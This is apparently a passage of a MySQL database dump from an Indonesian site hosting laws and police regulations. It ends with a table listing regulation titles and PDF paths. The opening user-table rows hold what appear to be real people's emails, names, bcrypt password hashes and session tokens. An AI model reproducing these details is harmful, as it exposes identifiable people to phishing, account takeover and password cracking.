INSERT INTO `pengguna` VALUES ('abuaqilsuhardi468@gmail.com', 'Suhardi', '$2y$10$kVeHwj55LvOeHl6sAAfsK.or.bNSHbGRZC12wdhHQ.fOeO764NM/i', '95qgs1RViRGUrpELfNfeag9Skv7AQsvluNYaHJYHVEbJBl91ydL64Md2K0rU', 0, '2021-07-06 21:21:47', '2021-07-06 21:21:47');
INSERT INTO `pengguna` VALUES ('indrajentol@gmail.com', 'Indra Dwi Nurdiyanto Putra', '$2y$10$LCttJ52EKS2SpusZilaILOymlSFztKAjPzivmr07vMQUog/w/TE7G', 'xxI2j4jjTOofLyfaHxnRGyHr3P7kiG0I9nsff5QqfRsEGS2G8QsasdsCbWzl', 0, '2021-07-07 01:55:07', '2021-07-07 01:55:07');
INSERT INTO `pengguna` VALUES ('laluahlan@gmail.com', 'LALU AHLAN APRIYANDI JALIL', '$2y$10$E5iAs8YbBT9jXbXIJm3moOFwa8SAV2yg4OSVlAceDmT863zz/VRjO', 'V2oGcObKylAqKlE3J0pRuBJk7TrTxRZGBFTzWYsfHZACqOieHuRjE1uR0h73', 0, '2021-07-07 10:11:20', '2021-07-07 10:11:20');
INSERT INTO `pengguna` VALUES ('hartenmuammarqadafi@gmail.com', 'Harten Muammar Qadafi', '$2y$10$YCoDM6qERni1SvnYCg7YTuKCYM.XL44Pk2ibkP4wcnVz395JNLn42', '3iesCjMjgeyuKNaTMk8RpwlM5WoqB6647ACTHGKNFj8GvtzeDi2gRqNV8W7N', 0, '2021-07-07 14:35:47', '2021-07-07 14:35:47');
INSERT INTO `pengguna` VALUES ('yudabigland@gmail.com', 'UMAR', '$2y$10$hfGFZXHejznkso0rFBDzie/W/yW1NV2yQgNHsG6CeM6XVDXQ9U546', 'BWpYyhH0BcuhNA3n8vFRGiiqLt35IanWOluFjTlSp2GvxgfBdDrvhS7BW1mN', 0, '2021-07-08 16:18:27', '2021-07-08 16:18:27');
INSERT INTO `pengguna` VALUES ('herison_ramdhoni@yahoo.co.id', 'Herison Ramdhoni', '$2y$10$Pzkn/rDcNEEZro5NYW3EGeX0Hz6eiKdo6QO8J2KYz9YNIv8T/vTvm', 'd4yiH1m9tMsPT8jn1bpHFP4ok0IbW2IHeMhfWFNqJUgNuxQGwSd1uLxHcSIT', 0, '2021-07-11 17:04:33', '2021-07-11 17:04:33');
INSERT INTO `pengguna` VALUES ('dinalay69@gmail.com', 'Dina Alisa', '$2y$10$MoxGqKOa0JpTSQrsB.TfQeoGN/9khr34He8bJq.Ni0GIGRazeB6ra', 'ZYzQDIrpRJXIiDztNADRYMDuYADph7MKlGSXqScckmVYYCBPSOHIX1hOhh9y', 0, '2021-07-21 15:25:25', '2021-07-21 15:25:25');
INSERT INTO `pengguna` VALUES ('agus.susanto.as817@Gmail.com', 'Agus susanto', '$2y$10$GOOOGLOJg4Sg4Lx0dAserunk0AdhWyEkmLlMwNR4kMAMMyXNx0zO6', 'si29Hq0Q5cVXAPtQUC0wBfuaXQMhRGvZIKj2nftVJRU6ROcvTXjIQ6BL35h6', 0, '2021-07-21 17:06:00', '2021-07-21 17:06:00');
INSERT INTO `pengguna` VALUES ('Sangnyomanardika@gmail.com', 'AIPDA SANG NYOMAN ARDIKA', '$2y$10$i1kuzooD/0lxyf5Pzl8MEeNch85w4ADm7qjbPK3S5wJ0yu5JAGh5u', '43fRNnJhQpawQ1QavtEx1i3smyJOeoXCSX0z8H6sPnMwuWb9iHzh9CIP1UEv', 0, '2021-07-22 10:04:51', '2021-07-22 10:04:51');
INSERT INTO `pengguna` VALUES ('lungguhh@gmail.com', 'lungguh hamribarlinton', '$2y$10$OaNK1XI9neB4u1Y5AbUK8.S1J1DrUJkat6zAitiTK/5e0J8742QKi', 'QD4AIG7GkpyDs5i4gIVBjPtMkzuRkMknSF2cAIfbaOoTBvydCREXvGaHHXTS', 0, '2021-08-30 16:01:01', '2021-08-30 16:01:01');
INSERT INTO `pengguna` VALUES ('misnan17.suryadi@gmail.com', 'MISNAN SURYADI', '$2y$10$qQXYMqbNAAKrDpCgJGnW.ubGMEJQacGXDM.mkz0kPhiFWAlKkRLxO', '3zdzkIutm96Z5ST4ibRT0sv6Q9xluWrmjWLVsvsedUdeZ03gICrh1RLzI4cp', 0, '2021-08-31 08:31:17', '2021-08-31 08:31:17');
INSERT INTO `pengguna` VALUES ('sheilaalleandradevian@gmail.com', 'sheila hermawanti', '$2y$10$2Kr3NsaKSq9ceU7amneasObjxZg8t95SEra7ADudSQlNrtzuC34L6', 'Pi9YMeL12vLHK3moK73LYy5MAlkUmvQjpaRqlDElk7UBLyAHtgmf58uGIhB5', 0, '2021-10-07 23:45:59', '2021-10-07 23:45:59');
INSERT INTO `pengguna` VALUES ('saepulpermana851@gmail.com', 'SAEPUL PERMANA', '$2y$10$n8pItLtJEG/AsmIganE3YOowW77UONNBCKnMsFsMPH/gC5bv76V66', 'xYTuRJHKZu7TOCJYTq4Qrx9KlNegNFMJ48W63Mp0IAtcixbUJqPSnBKNfjZl', 0, '2022-01-03 11:23:08', '2022-01-03 11:23:08');
INSERT INTO `pengguna` VALUES ('ajiqde79@gmail.com', 'I DEWA GEDE SUDEWA PUTRA', '$2y$10$BFLnLHMNNXtPAxgtEK1UYuCBeu9YrjK.vUooHFVb/81yzWjWWsu9W', 'xOP6EwFRolNJZU7HPmv3Wl22K1ZgjdE2KUvoYNqsbyWNam2Wyi2F9Uj6ITzH', 0, '2022-02-01 23:32:55', '2022-02-01 23:32:55');
INSERT INTO `pengguna` VALUES ('papasina3286@gmail.com', 'ki agus krisna febrianda yusuf', '$2y$10$rf93Mb6JUIx3XAtneUUBlOs5K0d3QYiqI3llDVU3LQ30Gc22jzWNC', 'G4GocyXqmgmjPZShlCBYBQQ17pA7BxQykILN6dJmCrqpfsmw2wyOk1SumI8i', 0, '2022-03-01 13:13:06', '2022-03-01 13:13:06');
INSERT INTO `pengguna` VALUES ('fandisakra303@dodcom', 'LALU MUHAMAD AFANDI', '$2y$10$CB0flBGwCyQaJmbfeFem8.VRcaGdN7RJzXVQzNVbtW9/Wqk..U596', 'qPcyFCc3lQZjFHEPkYbPyI1xz0pbcPojnLshUZomMZIz7lIDR2karytinBld', 0, '2022-05-18 19:02:38', '2022-05-18 19:02:38');

-- ----------------------------
-- Table structure for peraturan
-- ----------------------------
DROP TABLE IF EXISTS `peraturan`;
CREATE TABLE `peraturan`  (
  `peraturan_id` bigint UNSIGNED NOT NULL AUTO_INCREMENT,
  `peraturan_tanggal` date NULL DEFAULT NULL,
  `peraturan_judul` varchar(255) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `peraturan_file` longtext CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `peraturan_jenis_id` bigint UNSIGNED NOT NULL,
  `operator` varchar(255) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`peraturan_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 98 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of peraturan
-- ----------------------------
INSERT INTO `peraturan` VALUES (7, NULL, 'UU NOMOR 44 TAHUN 2007 TTG KAWASAN PERDAGANGAN BEBAS DAN PELABUHAN BEBAS', 'public/upload/peraturan/UU NOMOR 44 TAHUN 2007 TTG KAWASAN PERDAGANGAN BEBAS DAN PELABUHAN BEBAS6uH5mgBJudSbiQXQ.pdf', 2, 'Administrator', '2020-07-05 21:29:35', '2020-07-05 21:29:35');
INSERT INTO `peraturan` VALUES (8, NULL, 'UU NOMOR 2 TAHUN 2002 TTG KEPOLISIAN NEGARA REPUBLIK INDONESIA', 'public/upload/peraturan/UU NOMOR 2 TAHUN 2002 TTG KEPOLISIAN NEGARA REPUBLIK INDONESIAB9gKY7jxzh19ulJz.pdf', 2, 'Administrator', '2020-07-05 21:32:32', '2020-07-05 21:32:32');
INSERT INTO `peraturan` VALUES (9, NULL, 'UU NOMOR 5 TAHUN 2018 TTG PEMBERANTASAN TINDAK PIDANA TERORISME', 'public/upload/peraturan/UU NOMOR 5 TAHUN 2018 TTG PEMBERANTASAN TINDAK PIDANA TERORISMEAp05n1ZKOS6IphFr.pdf', 2, 'Administrator', '2020-07-05 21:33:59', '2020-07-05 21:33:59');
INSERT INTO `peraturan` VALUES (10, NULL, 'UU NOMOR 21 TAHUN 2007 TTG PEMBERANTASAN TINDAK PIDANA PREDAGANGAN ORANG', 'public/upload/peraturan/UU NOMOR 21 TAHUN 2007 TTG PEMBERANTASAN TINDAK PIDANA PREDAGANGAN ORANGFCYuIvrsTDFCTjuk.pdf', 2, 'Administrator', '2020-07-05 21:37:27', '2020-07-05 21:37:27');
INSERT INTO `peraturan` VALUES (11, NULL, 'UU NOMOR 22 TAHUN 2007 TTG PENYELENGGARAAN PEMILIHAN UMUM', 'public/upload/peraturan/UU NOMOR 22 TAHUN 2007 TTG PENYELENGGARAAN PEMILIHAN UMUM05yBcMjBEqwDC7Ch.pdf', 2, 'Administrator', '2020-07-05 21:39:26', '2020-07-05 21:39:26');
INSERT INTO `peraturan` VALUES (12, NULL, 'UU NOMOR 24 TAHUN 2007 TTG PENANGGULANGAN BENCANA', 'public/upload/peraturan/UU NOMOR 24 TAHUN 2007 TTG PENANGGULANGAN BENCANA7FZ58uAntv4PkFxX.pdf', 2, 'Administrator', '2020-07-05 21:41:35', '2020-07-05 21:41:35');
INSERT INTO `peraturan` VALUES (13, NULL, 'UU NOMOR 25 TAHUN 2007 TTG PENANAMAN MODAL', 'public/upload/peraturan/UU NOMOR 25 TAHUN 2007 TTG PENANAMAN MODALxxi1CFiNRNG9T9lX.pdf', 2, 'Administrator', '2020-07-05 21:42:58', '2020-07-05 21:42:58');
INSERT INTO `peraturan` VALUES (14, NULL, 'UU NOMOR 26 TAHUN 2007 TTG PENATAAN RUANG', 'public/upload/peraturan/UU NOMOR 26 TAHUN 2007 TTG PENATAAN RUANGuOtGsAYihsFVmU0h.pdf', 2, 'Administrator', '2020-07-05 21:46:41', '2020-07-05 21:46:41');
INSERT INTO `peraturan` VALUES (15, NULL, 'UU NOMOR 27 TAHUN 2007 TTG PENGELOLAAN WILAYAH PESISIR DAN PULAU-PULAU KECIL', 'public/upload/peraturan/UU NOMOR 27 TAHUN 2007 TTG PENGELOLAAN WILAYAH PESISIR DAN PULAU-PULAU KECILkGEoTxQGDrlz3CdX.pdf', 2, 'Administrator', '2020-07-05 21:48:32', '2020-07-05 21:48:32');
INSERT INTO `peraturan` VALUES (17, NULL, 'PUTUSAN MK RI NOMOR 18/PUU-XVII/2019 TTG FIDUSIA', 'public/upload/peraturan/PUTUSAN MK RI NOMOR 18/PUU-XVII/2019 TTG FIDUSIAEA9Unq8WbJPESJei.pdf', 1, 'Administrator', '2020-07-05 21:55:47', '2020-07-05 21:55:47');
INSERT INTO `peraturan` VALUES (18, NULL, 'UU NOMOR 42 TAHUN 1999 TTG JAMINAN FIDUSIA', 'public/upload/peraturan/UU NOMOR 42 TAHUN 1999 TTG JAMINAN FIDUSIA4llOctcvLrURCx5G.pdf', 2, 'Administrator', '2020-07-05 22:00:02', '2020-07-05 22:00:02');
INSERT INTO `peraturan` VALUES (19, NULL, 'UU NOMOR 28 TAHUN 1999 TTG PENYELENGGARAAN NEGARA YANG BERSIH DAN BEBAS DARI KORUPSI, KOLUSI DAN NEPOTISME', 'public/upload/peraturan/UU NOMOR 28 TAHUN 1999 TTG PENYELENGGARAAN NEGARA YANG BERSIH DAN BEBAS DARI KORUPSI, KOLUSI DAN NEPOTISME2Z7M1VMiePZRgyPS.pdf', 2, 'Administrator', '2020-07-05 22:09:57', '2020-07-05 22:09:57');
INSERT INTO `peraturan` VALUES (20, NULL, 'UU NOMOR 8 TAHUN 2010 TTG PENCEGAHAN DAN PEMBERANTASAN TINDAK PIDANA PENCUCIAN UANG', 'public/upload/peraturan/UU NOMOR 8 TAHUN 2010 TTG PENCEGAHAN DAN PEMBERANTASAN TINDAK PIDANA PENCUCIAN UANGRge0kvEBBOq3iVZy.pdf', 2, 'Administrator', '2020-07-05 22:10:57', '2020-07-05 22:10:57');
INSERT INTO `peraturan` VALUES (21, NULL, 'UU NOMOR 31 TAHUN 1999 TTG PEMBERANTASAN TINDAK PIDANA KORUPSI', 'public/upload/peraturan/UU NOMOR 31 TAHUN 1999 TTG PEMBERANTASAN TINDAK PIDANA KORUPSIsJvsul15Y9G5P0ql.pdf', 2, 'Administrator', '2020-07-05 22:11:54', '2020-07-05 22:11:54');
INSERT INTO `peraturan` VALUES (22, NULL, 'UU NOMOR 20 TAHUN 2001 TTG PEMBERANTASAN TINDAK PIDANA KORUPSI', 'public/upload/peraturan/UU NOMOR 20 TAHUN 2001 TTG PEMBERANTASAN TINDAK PIDANA KORUPSINx3NAnzAN0NDbmjM.pdf', 2, 'Administrator', '2020-07-05 22:14:42', '2020-07-05 22:14:42');
INSERT INTO `peraturan` VALUES (23, NULL, 'UU NOMOR 7 TAHUN 2012 TTG PENANGANAN KONFLIK SOSIAL', 'public/upload/peraturan/UU NOMOR 7 TAHUN 2012 TTG PENANGANAN KONFLIK SOSIALaI1uhBlvThEjWsQK.pdf', 2, 'Administrator', '2020-07-05 22:16:48', '2020-07-05 22:16:48');
INSERT INTO `peraturan` VALUES (24, NULL, 'UU NOMOR 10 TAHUN 2004 TTG PEMBENTUKAN PERATURAN PERUNDANG-UNDANGAN', 'public/upload/peraturan/UU NOMOR 10 TAHUN 2004 TTG PEMBENTUKAN PERATURAN PERUNDANG-UNDANGAN8sL7i0mLpenWN7N8.pdf', 2, 'Administrator', '2020-07-05 22:17:54', '2020-07-05 22:17:54');
INSERT INTO `peraturan` VALUES (25, NULL, 'PERKAP 8 TAHUN 2011 TTG PENGAMANAN EKSEKUSI JAMINAN FIDUSIA', 'public/upload/peraturan/PERKAP 8 TAHUN 2011 TTG PENGAMANAN EKSEKUSI JAMINAN FIDUSIAMGTgOO0SPT3jbVVL.pdf', 3, 'Administrator', '2020-07-05 22:21:19', '2020-07-05 22:21:19');
INSERT INTO `peraturan` VALUES (26, NULL, 'PERPOL 9 TAHUN 2019 TTG PENCABUTAN PERKAP KIP', 'public/upload/peraturan/PERPOL 9 TAHUN 2019 TTG PENCABUTAN PERKAP KIP9eJx8FByDcGwzcom.pdf', 3, 'Administrator', '2020-07-05 22:23:00', '2020-07-05 22:23:00');
INSERT INTO `peraturan` VALUES (27, NULL, 'PERPOL 1 TAHUN 2019 TTG ADMINISTRASI PENGAKHIRAN DINAS BAGI PEGAWAI NEGERI PADA POLRI', 'public/upload/peraturan/PERPOL 1 TAHUN 2019 TTG ADMINISTRASI PENGAKHIRAN DINAS BAGI PEGAWAI NEGERI PADA POLRIz5U6WdZ4JiSV0vVy.pdf', 3, 'Administrator', '2020-07-05 22:24:23', '2020-07-05 22:24:23');
INSERT INTO `peraturan` VALUES (28, NULL, 'PERPOL 2 TAHUN 2019 TTG PENCABUTAN PERKAP 3 TAHUN 2009 DAN 9 TAHUN 2011', 'public/upload/peraturan/PERPOL 2 TAHUN 2019 TTG PENCABUTAN PERKAP 3 TAHUN 2009 DAN 9 TAHUN 2011qhC4ItQkRM7zsdqM.pdf', 3, 'Administrator', '2020-07-05 22:25:36', '2020-07-05 22:25:36');
INSERT INTO `peraturan` VALUES (29, NULL, 'PERPOL 3 TAHUN 2019 TTG PEMBERIAN BANTUAN PENGAMANAN PADA OBJEK VITAL NASIONAL DAN OBJEK TERTENTU', 'public/upload/peraturan/PERPOL 3 TAHUN 2019 TTG PEMBERIAN BANTUAN PENGAMANAN PADA OBJEK VITAL NASIONAL DAN OBJEK TERTENTU8Coaqx7lsJe2kseL.pdf', 3, 'Administrator', '2020-07-05 22:26:59', '2020-07-05 22:26:59');
INSERT INTO `peraturan` VALUES (30, NULL, 'PERPOL 4 TAHUN 2019 TTG CARA LINTAS GANTI DAN CARA BERTINDAK DALAM PENANGGULANGAN HURU-HARA', 'public/upload/peraturan/PERPOL 4 TAHUN 2019 TTG CARA LINTAS GANTI DAN CARA BERTINDAK DALAM PENANGGULANGAN HURU-HARA4Ypw6lT2kkhJEbPg.pdf', 3, 'Administrator', '2020-07-05 22:30:53', '2020-07-05 22:30:53');
INSERT INTO `peraturan` VALUES (31, NULL, 'PERPOL 5 TAHUN 2019 TTG SOTK MABES', 'public/upload/peraturan/PERPOL 5 TAHUN 2019 TTG SOTK MABES0WXtQ2i3sbKsmwbK.pdf', 3, 'Administrator', '2020-07-05 22:33:04', '2020-07-05 22:33:04');
INSERT INTO `peraturan` VALUES (32, NULL, 'PERPOL 6 TAHUN 2019 TTG MANAJEMEN PENYIDIKAN TINDAK PIDANA', 'public/upload/peraturan/PERPOL 6 TAHUN 2019 TTG MANAJEMEN PENYIDIKAN TINDAK PIDANA3Fq8bxAswPBrf1OR.pdf', 3, 'Administrator', '2020-07-05 22:43:24', '2020-07-05 22:43:24');
INSERT INTO `peraturan` VALUES (33, NULL, 'PERPOL 7 TAHUN 2019 TTG PEMBERIAN BANTUAN PENGAMANAN PADA OBJEK VITAL NASIONAL DAN OBJEK TERTENTU', 'public/upload/peraturan/PERPOL 7 TAHUN 2019 TTG PEMBERIAN BANTUAN PENGAMANAN PADA OBJEK VITAL NASIONAL DAN OBJEK TERTENTUg25wZJPRSV62hUEV.pdf', 3, 'Administrator', '2020-07-05 22:44:54', '2020-07-05 22:44:54');
INSERT INTO `peraturan` VALUES (34, NULL, 'PERKAP 4 TAHUN 2019 TTG SELESI DIKBANG BAGI PEGAWAI NEGERI PADA POLRI', 'public/upload/peraturan/PERKAP 4 TAHUN 2019 TTG SELESI DIKBANG BAGI PEGAWAI NEGERI PADA POLRI1pm6QXyZRPU4jsX2.pdf', 3, 'Administrator', '2020-07-05 22:45:48', '2020-07-05 22:45:48');
INSERT INTO `peraturan` VALUES (35, NULL, 'PERPOL 8 TAHUN 2019 TTG KONFIRMASI STATUS WAJIB PAJAK DALAM PEMBERIAN LAYANAN PUBLIK TERTENTU PADA POLRI', 'public/upload/peraturan/PERPOL 8 TAHUN 2019 TTG KONFIRMASI STATUS WAJIB PAJAK DALAM PEMBERIAN LAYANAN PUBLIK TERTENTU PADA POLRImP8ly732i5qfToTJ.pdf', 3, 'Administrator', '2020-07-05 22:46:51', '2020-07-05 22:46:51');
INSERT INTO `peraturan` VALUES (36, NULL, 'PERKAP 9 TAHUN 2019 TTG PENERBITAN STNKB DINAS DAN TNKB DINAS POLRI', 'public/upload/peraturan/PERKAP 9 TAHUN 2019 TTG PENERBITAN STNKB DINAS DAN TNKB DINAS POLRIDnZSmZXZOJbuvuTR.pdf', 3, 'Administrator', '2020-07-05 22:47:59', '2020-07-05 22:47:59');
INSERT INTO `peraturan` VALUES (37, NULL, 'PERKAP 8 TAHUN 2019 TTG KARTU ISTRI/SUAMI PEGAWAI NEGERI PADA POLRI', 'public/upload/peraturan/PERKAP 8 TAHUN 2019 TTG KARTU ISTRI/SUAMI PEGAWAI NEGERI PADA POLRIfZC48MBIlIlvnbWm.pdf', 3, 'Administrator', '2020-07-05 22:49:29', '2020-07-05 22:49:29');
INSERT INTO `peraturan` VALUES (38, NULL, 'PERPOL 5 TAHUN 2019 TTG POKOK-POKOK PENYELENGGARAAN POLRI SEKTOR SEBAGAI UJUNG TOMBAK', 'public/upload/peraturan/PERPOL 5 TAHUN 2019 TTG POKOK-POKOK PENYELENGGARAAN POLRI SEKTOR SEBAGAI UJUNG TOMBAKWjtvSA5XZHXCGVR1.pdf', 3, 'Administrator', '2020-07-05 22:51:07', '2020-07-05 22:51:07');
INSERT INTO `peraturan` VALUES (39, NULL, 'PERKAP 7 TAHUN 2019 TTG PUSAT KENDALI (COMMAD CENTER) POLRI', 'public/upload/peraturan/PERKAP 7 TAHUN 2019 TTG PUSAT KENDALI (COMMAD CENTER) POLRIbMA2tLWckUUVRzeL.pdf', 3, 'Administrator', '2020-07-05 22:52:25', '2020-07-05 22:52:25');
INSERT INTO `peraturan` VALUES (40, NULL, 'PERKAP 2 TAHUN 2019 TTG PENINDAKAN HURU HARA', 'public/upload/peraturan/PERKAP 2 TAHUN 2019 TTG PENINDAKAN HURU HARASSLAObtmuyhBdcfR.pdf', 3, 'Administrator', '2020-07-05 22:53:52', '2020-07-05 22:53:52');
INSERT INTO `peraturan` VALUES (41, NULL, 'PERPOL 3 TAHUN 2019 TTG MANAJEMEN TALENTA POLRI', 'public/upload/peraturan/PERPOL 3 TAHUN 2019 TTG MANAJEMEN TALENTA POLRITPTo02LqHfiPFqzL.pdf', 3, 'Administrator', '2020-07-05 22:55:10', '2020-07-05 22:55:10');
INSERT INTO `peraturan` VALUES (42, NULL, 'PERPOL 15 TAHUN 2018 TTG PAKAIAN DINAS PEGAWAI NEGERI PADA POLRI', 'public/upload/peraturan/PERPOL 15 TAHUN 2018 TTG PAKAIAN DINAS PEGAWAI NEGERI PADA POLRI0ql6JzbeBcmpyRL2.pdf', 3, 'Administrator', '2020-07-05 22:57:03', '2020-07-05 22:57:03');
INSERT INTO `peraturan` VALUES (43, NULL, 'PERPOL 16 TAHUN 2018 TTG TATA CARA KERJA BADAN PENGUJI KESEHATAN PERSONEL POLRI', 'public/upload/peraturan/PERPOL 16 TAHUN 2018 TTG TATA CARA KERJA BADAN PENGUJI KESEHATAN PERSONEL POLRIbgkHTjuIQQxwVian.pdf', 3, 'Administrator', '2020-07-05 22:58:32', '2020-07-05 22:58:32');
INSERT INTO `peraturan` VALUES (44, NULL, 'PERPOL 13 TAHUN 2018 TTG PERUMAHAN DINAS/ASRAMA/MES POLRI', 'public/upload/peraturan/PERPOL 13 TAHUN 2018 TTG PERUMAHAN DINAS/ASRAMA/MES POLRIgAWyMHBTGYz6I7LK.pdf', 3, 'Administrator', '2020-07-05 22:59:17', '2020-07-05 22:59:17');
INSERT INTO `peraturan` VALUES (45, NULL, 'PERPOL 12 TAHUN 2018 TTG PENUGASAN ANGGOTA POLRI DI LUAR STRUKTUR ORGANISASI', 'public/upload/peraturan/PERPOL 12 TAHUN 2018 TTG PENUGASAN ANGGOTA POLRI DI LUAR STRUKTUR ORGANISASIMuO5Lr9ObFtvmJ6O.pdf', 3, 'Administrator', '2020-07-05 23:00:39', '2020-07-05 23:00:39');
INSERT INTO `peraturan` VALUES (46, NULL, 'PERKAP 6 TAHUN 2019 TTG PENYIDIKAN TINDAK PIDANA', 'public/upload/peraturan/PERKAP 6 TAHUN 2019 TTG PENYIDIKAN TINDAK PIDANABansTUXVDmtCEVz7.pdf', 3, 'Administrator', '2020-07-05 23:01:27', '2020-07-05 23:01:27');
INSERT INTO `peraturan` VALUES (47, NULL, 'PERKAP 1 TAHUN 2019 TTG SISTEM MANAJEMEN DAN STANDAR KEBERHASILAN OPERASIONAL POLRI', 'public/upload/peraturan/PERKAP 1 TAHUN 2019 TTG SISTEM MANAJEMEN DAN STANDAR KEBERHASILAN OPERASIONAL POLRIDaiIPSUVWa1foLmo.pdf', 3, 'Administrator', '2020-07-05 23:02:32', '2020-07-05 23:02:32');
INSERT INTO `peraturan` VALUES (48, NULL, 'PERKAP 6 TAHUN 2018 TTG PAKAIAN DINAS PEGAWAI NEGERI PADA POLRI', 'public/upload/peraturan/PERKAP 6 TAHUN 2018 TTG PAKAIAN DINAS PEGAWAI NEGERI PADA POLRIKcYnRkLHWW7wMFRM.pdf', 3, 'Administrator', '2020-07-05 23:06:06', '2020-07-05 23:06:06');
INSERT INTO `peraturan` VALUES (49, NULL, 'PERPOL 14 TAHUN 2018 TTG SOTK POLDA', 'public/upload/peraturan/PERPOL 14 TAHUN 2018 TTG SOTK POLDAVv25atj3Hlw9Wyb4.pdf', 3, 'Administrator', '2020-07-05 23:09:30', '2020-07-05 23:09:30');
INSERT INTO `peraturan` VALUES (50, NULL, 'PERKAP 19 TAHUN 2011 TTG PENCALONAN ANGGOTA POLRI DALAM PEMILIHAN KEPALA DAERAH/WAKIL KEPALA DAERAH', 'public/upload/peraturan/PERKAP 19 TAHUN 2011 TTG PENCALONAN ANGGOTA POLRI DALAM PEMILIHAN KEPALA DAERAH/WAKIL KEPALA DAERAHa1KzDeC9DGLzy6Oe.pdf', 3, 'Administrator', '2020-07-05 23:10:57', '2020-07-05 23:10:57');
INSERT INTO `peraturan` VALUES (51, NULL, 'PERKAP 17 TAHUN 2017 TTG PERIZINAN, PENGAMANAN, PENGAWASAN DAN PENGENDALIAN BAHAN PELEDAK KOMERSIL', 'public/upload/peraturan/PERKAP 17 TAHUN 2017 TTG PERIZINAN, PENGAMANAN, PENGAWASAN DAN PENGENDALIAN BAHAN PELEDAK KOMERSIL2wSvmMyFIA0wRtui.pdf', 3, 'Administrator', '2020-07-05 23:12:16', '2020-07-05 23:12:16');
INSERT INTO `peraturan` VALUES (52, NULL, 'PERKAP 19 TAHUN 2017 TTG PELAKSANAAN PROMOSI JABATAN TERBUKA DI LINGKUNGAN POLRI', 'public/upload/peraturan/PERKAP 19 TAHUN 2017 TTG PELAKSANAAN PROMOSI JABATAN TERBUKA DI LINGKUNGAN POLRID2jJvvVsyfZ8cQbI.pdf', 3, 'Administrator', '2020-07-05 23:16:52', '2020-07-05 23:16:52');
INSERT INTO `peraturan` VALUES (53, NULL, 'PERKAP 18 TAHUN 2017 TTG TATA CARA PEMBERIAN TUNJANGAN KINERJA BAGI PEGAWAI DI LINGKUNGAN POLRI', 'public/upload/peraturan/PERKAP 18 TAHUN 2017 TTG TATA CARA PEMBERIAN TUNJANGAN KINERJA BAGI PEGAWAI DI LINGKUNGAN POLRIeGlIWAjSlSbto0KI.pdf', 3, 'Administrator', '2020-07-05 23:18:36', '2020-07-05 23:18:36');
INSERT INTO `peraturan` VALUES (54, NULL, 'PERPOL 1 TAHUN 2018 TTG LAYANAN POLISI 110', 'public/upload/peraturan/PERPOL 1 TAHUN 2018 TTG LAYANAN POLISI 110KCVM43bnlHuUr40X.pdf', 3, 'Administrator', '2020-07-05 23:19:23', '2020-07-05 23:19:23');
INSERT INTO `peraturan` VALUES (55, NULL, 'PERPOL 3 TAHUN 2018 TTG HTCK POLRI', 'public/upload/peraturan/PERPOL 3 TAHUN 2018 TTG HTCK POLRIT2LVg3G9xO1zwoyK.pdf', 3, 'Administrator', '2020-07-05 23:20:58', '2020-07-05 23:20:58');
INSERT INTO `peraturan` VALUES (56, NULL, 'PERKAP 9 TAHUN 2010 TTG TATA CARA PERKAWINAN, PERCERAIAN DAN RUJUK BAGI PEGAWAI NEGERI PADA POLRI', 'public/upload/peraturan/PERKAP 9 TAHUN 2010 TTG TATA CARA PERKAWINAN, PERCERAIAN DAN RUJUK BAGI PEGAWAI NEGERI PADA POLRIaiS6QAlWEYEwLX6l.pdf', 3, 'Administrator', '2020-07-05 23:37:12', '2020-07-05 23:37:12');
INSERT INTO `peraturan` VALUES (57, NULL, 'PERKAP 4 TAHUN 2018 TTG PEMBINAAN JASMANI DI LINGKUNGAN POLRI', 'public/upload/peraturan/PERKAP 4 TAHUN 2018 TTG PEMBINAAN JASMANI DI LINGKUNGAN POLRIU60hVf07R0yS8X5p.pdf', 3, 'Administrator', '2020-07-05 23:47:22', '2020-07-05 23:47:22');
INSERT INTO `peraturan` VALUES (58, NULL, 'PERKAP 9 TAHUN 2010 TTG PENGAJUAN PERKAWINAN, PERCERAIN DAN RUJUK BAGI PEGAWAI NEGERI PADA POLRI', 'public/upload/peraturan/PERKAP 9 TAHUN 2010 TTG PENGAJUAN PERKAWINAN, PERCERAIN DAN RUJUK BAGI PEGAWAI NEGERI PADA POLRIRPVlDN2BYQZ70PeG.pdf', 3, 'Administrator', '2020-07-06 21:29:37', '2020-07-06 21:29:37');
INSERT INTO `peraturan` VALUES (59, NULL, 'PERPOL NO 4 TH 2018 TTG PEMBENTUKAN SATWIL', 'public/upload/peraturan/PERPOL NO 4 TH 2018 TTG PEMBENTUKAN SATWILUxRVlFScrusBNHc4.pdf', 3, 'Administrator', '2020-07-06 21:43:42', '2020-07-06 21:43:42');
INSERT INTO `peraturan` VALUES (60, NULL, 'PERPRES 16 TAHUN 2018 TTG PENGADAAN BARANG/JASA PEMERINTAH', 'public/upload/peraturan/PERPRES 16 TAHUN 2018 TTG PENGADAAN BARANG/JASA PEMERINTAH5p56Zc1vjvMMuISs.pdf', 5, 'Administrator', '2020-07-10 23:32:00', '2020-07-10 23:32:00');
INSERT INTO `peraturan` VALUES (61, NULL, 'PERKAP 13 TAHUN 2015 TTG TATA CARA PEMBERIAN TUNJANGAN KINERJA BAGI PEGAWAI DI LINGKUNGAN POLRI', 'public/upload/peraturan/PERKAP 13 TAHUN 2015 TTG TATA CARA PEMBERIAN TUNJANGAN KINERJA BAGI PEGAWAI DI LINGKUNGAN POLRIj9uMf0CYdJhjsrFP.pdf', 3, 'Administrator', '2020-07-10 23:37:16', '2020-07-10 23:37:16');
INSERT INTO `peraturan` VALUES (63, NULL, 'PERKAP 14 TAHUN 2011 TTG KODE ETIK PROFESI POLRI', 'public/upload/peraturan/PERKAP 14 TAHUN 2011 TTG KODE ETIK PROFESI POLRIzNGk4ZugSTf6dUPu.pdf', 3, 'Administrator', '2020-07-10 23:40:06', '2020-07-10 23:40:06');
INSERT INTO `peraturan` VALUES (64, NULL, 'Penanggulangan Penyakit Menular', 'public/upload/peraturan/Penanggulangan Penyakit MenularraNzcAydpoSfBI1O.pdf', 4, 'Administrator', '2021-01-06 12:01:37', '2021-01-06 12:01:37');
